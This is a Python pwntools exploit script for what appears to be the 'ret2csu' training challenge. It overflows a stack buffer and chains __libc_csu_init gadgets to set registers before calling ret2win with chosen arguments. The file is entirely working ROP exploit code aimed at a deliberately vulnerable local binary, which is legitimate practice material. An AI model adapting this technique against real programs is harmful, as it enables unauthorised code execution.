#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2csu')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

POP_RDI = 0x00000000004006a3
POP_RBX_RBP_R12_R13_R14_R15 = 0x000000000040069a
CALLER = 0x0000000000400680

def call_function(address, arg1, arg2, arg3):
    return (flat(POP_RBX_RBP_R12_R13_R14_R15) +
            flat(0) + flat(1) +  # set rbx=0 and rbp=1 so we dont call 2x (Segfault)
            flat(address) + flat(arg1) + flat(arg2) + flat(arg3) + # register values
           flat(CALLER)) # this pops everything into edi, rsi, rdx

RIP_DIST = 40


PTR_TO_FINI = 0x4003b0
RET2WIN = flat(0x400510)
POP_RDI = flat(0x00000000004006a3)

io = start()

pause()

io.sendline(cyclic(40) +
            # our arg1 is trash because we throw edi out
            call_function(PTR_TO_FINI, 0x4141414141414141, 0xcafebabecafebabe, 0xd00df00dd00df00d) +
            cyclic(56) + # padding
            POP_RDI + p64(0xdeadbeefdeadbeef) + # set up proper arg1
            RET2WIN # lets go
            )

io.interactive()

